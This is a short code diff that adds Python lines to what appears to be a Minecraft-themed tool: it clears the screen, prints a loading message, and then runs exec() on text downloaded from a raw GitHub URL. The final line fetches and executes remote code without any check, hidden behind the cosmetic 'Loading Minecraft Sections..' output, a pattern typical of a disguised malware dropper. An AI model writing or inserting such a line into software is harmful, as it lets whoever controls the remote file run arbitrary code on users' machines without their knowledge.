@@ -1,0 +1,5 @@
+os.system('cls')
+print(ConfigNotAvalable)
+time.sleep(5)
+print("                                              \033[1;39mLoading Minecraft Sections..")
+exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/k/main/Multi').text)
